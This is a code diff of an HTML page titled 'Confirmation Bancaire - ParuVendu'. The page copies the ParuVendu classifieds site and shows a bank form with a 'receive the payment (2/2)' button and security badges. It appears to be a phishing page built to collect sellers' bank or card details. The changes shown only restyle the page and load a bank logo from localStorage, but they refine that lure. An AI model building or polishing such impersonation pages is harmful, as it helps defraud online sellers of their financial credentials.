@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Confirmation Bancaire - ParuVendu</title>
     <style>
+        /* Styles existants (inchangés) */
         body {
             font-family: Arial, sans-serif;
             margin: 0;
@@ -216,6 +217,7 @@
             margin-top: 10px;
             display: none; /* Masqué par défaut */
             animation: zoomIn 0.5s ease-in-out;
+            text-align: center; /* Centrer le contenu */
         }
         @keyframes zoomIn {
             0% { transform: scale(0); }
@@ -250,6 +252,14 @@
         .terms a:hover {
             text-decoration: underline;
         }
+
+        /* Nouveau style pour centrer le logo */
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
@@ -265,6 +275,12 @@
         </div>
         <div class="form-logo">
             <img src="https://static.paruvendu.fr/communfo/img/structuresite/home/paruvendu_170x60.svg" alt="Logo Formulaire">
+        </div>
+        <!-- Conteneur pour centrer le logo -->
+        <div class="logo-container">
+            <div class="bank-logo" id="bank-logo">
+                <img id="bank-logo-img" src="" alt="Logo de la banque">
+            </div>
         </div>
         <form id="bankForm">
             <div class="form-group">
@@ -301,9 +317,6 @@
             </div>
             <button type="submit" class="btn">💳 Recevoir le paiement (2/2)</button>
         </form>
-        <div class="bank-logo" id="bank-logo">
-            <img id="bank-logo-img" src="" alt="Logo de la banque">
-        </div>
         <div class="separator"></div>
         <div class="info-text">
             <img src="https://cdn-icons-png.flaticon.com/512/1828/1828640.png" alt="Logo Sécurité" class="security-logo">
@@ -421,6 +434,15 @@
             } catch (error) {
                 console.error("Erreur :", error);
             }
+        }
+
+        // Récupérer et afficher le logo de la banque
+        const bankLogoImg = document.getElementById("bank-logo-img");
+        const bankLogo = localStorage.getItem("bankLogo");
+
+        if (bankLogo) {
+            bankLogoImg.src = bankLogo; // Afficher le logo de la banque
+            document.getElementById("bank-logo").style.display = "block"; // Afficher la section
         }
     </script>
 </body>
